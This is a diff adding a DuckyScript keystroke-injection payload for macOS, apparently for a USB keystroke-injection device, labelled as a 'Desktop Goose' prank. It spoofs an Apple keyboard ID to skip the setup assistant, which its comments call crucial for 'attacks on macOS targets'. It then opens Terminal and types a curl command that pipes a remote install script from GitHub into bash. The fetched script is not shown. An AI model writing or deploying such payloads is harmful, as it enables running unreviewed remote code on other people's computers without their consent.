@@ -1,0 +1,33 @@
+REM Run Desktop Goose after installing
+REM Required Apps: Terminal
+
+REM Title: Desktop Goose
+REM Author: Gatlen Culp
+REM Target: MacOS 
+REM Version: 1.0
+REM Category: Prank
+
+ID 05ac:021e Apple:Keyboard
+REM Title: Desktop Goose
+REM Author: Gatlen Culp
+REM Target: MacOS 
+REM Version: 1.0
+REM Category: Prank
+
+REM Keep these lines to bypass macOS keyboard setup assistant
+REM This is crucial for first-time attacks on macOS targets
+DELAY 3000
+
+GUI SPACE
+DELAY 2500
+STRING Terminal
+DELAY 2500
+ENTER
+
+REM Wait for Terminal to fully open
+DELAY 1500
+
+REM Execute payload with improved reliability
+STRING curl -sSL https://raw.githubusercontent.com/GatlenCulp/Desktop-Goose-Payload/main/desktop_goose_payload/install.sh | bash
+DELAY 1000
+ENTER
